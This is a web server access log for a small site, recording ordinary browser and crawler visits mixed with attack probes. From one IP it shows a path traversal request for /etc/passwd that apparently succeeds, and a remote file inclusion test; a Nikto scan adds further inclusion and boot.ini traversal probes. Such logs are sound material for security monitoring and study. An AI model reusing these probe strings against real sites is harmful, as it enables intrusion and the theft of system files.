66.249.66.1 - - [25/Jun/2025:17:30:01 +0700] "GET /robots.txt HTTP/1.1" 200 120 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
114.122.8.12 - - [25/Jun/2025:17:30:15 +0700] "GET / HTTP/1.1" 200 8754 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
114.122.8.12 - - [25/Jun/2025:17:30:16 +0700] "GET /css/style.css HTTP/1.1" 200 4321 "http://www.idn.id/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
114.122.8.12 - - [25/Jun/2025:17:30:16 +0700] "GET /js/main.js HTTP/1.1" 200 12098 "http://www.idn.id/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
114.122.8.12 - - [25/Jun/2025:17:30:17 +0700] "GET /images/logo.png HTTP/1.1" 200 5433 "http://www.idn.id/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
207.46.13.150 - - [25/Jun/2025:17:30:20 +0700] "GET /products.php HTTP/1.1" 200 6543 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
36.72.210.5 - - [25/Jun/2025:17:31:05 +0700] "GET /products.php?id=123 HTTP/1.1" 200 3412 "http://www.idn.id/products.php" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
36.72.210.5 - - [25/Jun/2025:17:31:09 +0700] "GET /about.html HTTP/1.1" 200 2109 "http://www.idn.id/products.php?id=123" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
114.122.8.12 - - [25/Jun/2025:17:31:40 +0700] "GET /contact.php HTTP/1.1" 200 1888 "http://www.idn.id/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
125.161.130.99 - - [25/Jun/2025:17:32:11 +0700] "GET / HTTP/1.1" 200 8754 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
125.161.130.99 - - [25/Jun/2025:17:32:12 +0700] "GET /css/style.css HTTP/1.1" 304 0 "http://www.idn.id/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
66.249.66.5 - - [25/Jun/2025:17:32:55 +0700] "GET /gallery.php?page=3 HTTP/1.1" 200 10245 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
103.152.118.23 - - [25/Jun/2025:17:33:02 +0700] "POST /contact.php HTTP/1.1" 302 0 "http://www.idn.id/contact.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"
103.152.118.23 - - [25/Jun/2025:17:33:03 +0700] "GET /thankyou.html HTTP/1.1" 200 1500 "http://www.idn.id/contact.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0"
202.80.212.40 - - [25/Jun/2025:17:34:28 +0700] "GET /images/product/item123.jpg HTTP/1.1" 200 45012 "http://www.idn.id/products.php?id=123" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
36.72.210.5 - - [25/Jun/2025:17:35:10 +0700] "GET /images/promo/sale.png HTTP/1.1" 404 499 "http://www.idn.id/about.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
114.122.8.12 - - [25/Jun/2025:17:40:10 +0700] "GET /login.php HTTP/1.1" 200 2500 "http://www.idn.id/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.191.171.11 - - [25/Jun/2025:17:45:01 +0700] "GET / HTTP/1.1" 200 8754 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.191.171.11 - - [25/Jun/2025:17:45:05 +0700] "GET /index.php?page=contact HTTP/1.1" 200 1888 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.191.171.11 - - [25/Jun/2025:17:45:08 +0700] "GET /index.php?file=about HTTP/1.1" 404 499 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.191.171.11 - - [25/Jun/2025:17:45:10 +0700] "GET /main.php?path=news HTTP/1.1" 404 499 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.191.171.11 - - [25/Jun/2025:17:45:12 +0700] "GET /view.php?item=latest HTTP/1.1" 404 499 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.191.171.11 - - [25/Jun/2025:17:45:18 +0700] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 200 9542 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
203.0.113.58 - - [25/Jun/2025:17:45:20 +0700] "GET /?page=http://test.com/test HTTP/1.1" 200 8754 "-" "Nikto/2.1.6"
203.0.113.58 - - [25/Jun/2025:17:45:21 +0700] "GET /?file=../../boot.ini HTTP/1.1" 404 499 "-" "Nikto/2.1.6"
185.191.171.11 - - [25/Jun/2025:17:45:30 +0700] "GET /index.php?page=http://www.google.com HTTP/1.1" 200 15498 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
112.215.172.3 - - [25/Jun/2025:17:48:00 +0700] "GET /products.php?id=FU3C4MRSGY4DSMBMGEYDMLRXGE2DMMBV HTTP/1.1" 200 3500 "http://www.idn.id/products.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
